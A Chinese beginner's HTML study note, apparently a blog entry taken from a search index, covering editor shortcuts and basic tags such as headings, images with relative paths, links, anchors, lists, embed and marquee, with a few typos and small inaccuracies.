html:xt + tab html结构 html:5 + tab html结构 Ctrl+shift+D 快速复制 Ctrl+shift+K 快速删除一行 Ctrl+shift+↑/↓ 快速上下移动一行 Tab 补全标签 Ctrl+鼠标左键 选中多行 Ctrl+L 选中一行 Ctrl+H 替换别的标签 Alt+shift+2 查看布局 Alt+V 显示/隐藏菜单栏 ctrl+shift+p + move指令 移动文件 HTML标签单标签1231 &lt;!--注释: 快捷键Ctrl+/--&gt; 2 &lt;br/&gt; 换行3 &lt;hr/&gt; 水平线 双标签 段落标签：&lt;p&gt;&lt;/p&gt; 文本标签：&lt;font&gt;&lt;/font&gt; 标题标签：12341 &lt;h1&gt;&lt;/h1&gt;2 &lt;!--h1只能出现一次，出现多了不利于搜索引擎--&gt;3 &lt;h2&gt;&lt;/h2&gt;4 &lt;h6&gt;&lt;/h6&gt; 标题系列取值只能取到h6 文本格式化标签 加粗 , 常用strong 倾斜 , 常用em 删除线标签 , 常用del 插入文本： , 常用ins 上下标标签：, 注意：使用strong em del ins 更有意义 图片标签&lt;img src=&quot;Legolas.jpg&quot; alt=&quot;我的男神&quot; title=&quot;legolas&quot; width=&quot;500&quot; /&gt; 仅指定宽或高时，等比例缩放。 src 图片来源（路径）, alt 替换文本. title 提示文本（鼠标放到图片上显示的文字; width 图片显示的宽度 height 图片显示的高度 相对路径和绝对路径（相对路径的可移植性好） 相对路径： 文档（html/图片）在同一个文件夹，直接写图片（文档）名字 &lt;img src=&quot;Legolas.jpg&quot; alt=&quot;legolas&quot; height=&quot;300&quot; /&gt; 文档不在同一个文件夹，在上级文件中 &lt;img src=&quot;../1.jpg&quot; alt=&quot;legolas&quot; height=&quot;300&quot; /&gt; 文档不在同一个文件夹，在上两级文件中 &lt;img src=&quot;../../Hydrangeas.jpg&quot; alt=&quot;菊花&quot; height=&quot;300&quot; /&gt; 文档不在同一个文件夹，在下级文件中 &lt;img src=&quot;pic/Koala.jpg&quot; alt=&quot;考拉&quot; height=&quot;300&quot; /&gt; 文档不在同一个文件夹，在下两级文件中 &lt;img src=&quot;pic/photo/Penguins.jpg&quot; alt=&quot;企鹅&quot; height=&quot;300&quot; /&gt; 绝对路径： 本地电脑绝对路径 &lt;img src=&quot;F:\pic\photo&quot; alt=&quot;企鹅&quot; /&gt; 互联网上的绝对路径： 网页中的图片来自服务器端传输过来的。 超链接标签超链接：&lt;a href=&quot;06_test&quot; target=&quot;_blank&quot; title=&quot;气温高&quot;&gt;气温案例&lt;/a&gt; href 去往的路径（连接的文档），必写属性。 target=” _self” 关闭自身串口，打开新窗口 target=”_blank” 自身窗口不关闭，打开新窗口 title 提示文本，是非必须的 ctrl+shift+s: 另存为 把文件复制并另存为 超链接优化： &lt;base target=”_blank”&gt; 锚点： 第一步：给标签加id 第二部：herf写上#+id名 &lt;a href=&quot;#xd&quot;&gt;回到顶部&lt;/a&gt; 压缩包：&lt;a href=&quot;压缩包.rar&quot;&gt;压缩文件下载&lt;/a&gt; 空连接：&lt;a href=&quot;#&quot;&gt;此处有连接&lt;/a&gt; 特殊字符：段落标签的写法列表标签 无序列表 square 实心方块 dick 默认实心小圆圈 circle 空心小圆圈 注意：ul标签里面只能放li标签，li里面可以放任何标签 有序列表 12345671 &lt;ol&gt;2 &lt;li&gt;打开冰箱门&lt;/li&gt;3 &lt;li&gt;把大象装在冰箱里&lt;/li&gt;4 &lt;li&gt;关上冰箱门&lt;/li&gt;5 &lt;/ol&gt;6 &lt;ol type="A"&gt;&lt;/ol&gt;7 &lt;ol type="1" start="4"&gt;&lt;/ol&gt; type 的取值可以是1，a，A，i，I start 是开始的序号 自定义列表 12341 &lt;dl&gt;2 &lt;dt&gt;北京&lt;/dt&gt; &lt;!--小标题--&gt;3 &lt;dd&gt;昌平区&lt;/dd&gt; &lt;!—标题的解释--&gt;4 &lt;/dl&gt; 其他标签 音乐标签 embed 背景音乐 &lt;embed src=&quot;BIGBANG - BAD BOY (Live).mp3&quot; hidden=&quot;false&quot; /&gt; hidden = “ture” 影藏，默认是false，播放器 滚动标签 &lt;marquee behavior=&quot;scroll&quot; direction=&quot;right&quot; width=&quot;500px&quot; height=&quot;100px&quot; bgcolor=&quot;blue&quot;&gt;我来也&lt;/marquee&gt;]]></content>
      <categories>
        <category>HTML系列</category>
      </categories>
      <tags>
        <tag>html</tag>
      </tags>
  </entry>
</search>
